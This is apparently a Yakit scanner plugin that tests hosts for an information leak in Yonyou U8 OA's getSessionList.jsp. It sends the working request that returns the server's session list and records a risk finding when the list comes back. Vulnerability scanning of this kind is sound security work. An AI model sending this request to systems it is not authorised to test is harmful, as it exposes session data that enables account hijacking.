# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port, payload){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0

`
    println(payload)
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"payload":payload}),
    poc.https(isTls),
    poc.redirectTimes(0),
    // poc.proxy("http://127.0.0.1:8083"),
    )
    if len(rsp) > 0 {
        if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`) && str.MatchAllOfSubString(rsp, `<SessionList>`){ 
            yakit.Info("%v 用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞", addr)
            risk.NewRisk(
            addr,risk.title("用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞"),
            risk.severity("middle"),
            risk.titleVerbose("用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞存在"),
            risk.type("信息泄露[用友 U8 OA]"),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }
       
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    payload = `/yyoa/ext/https/getSessionList.jsp?cmd=getAll`

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port, payload)
    }
    
}
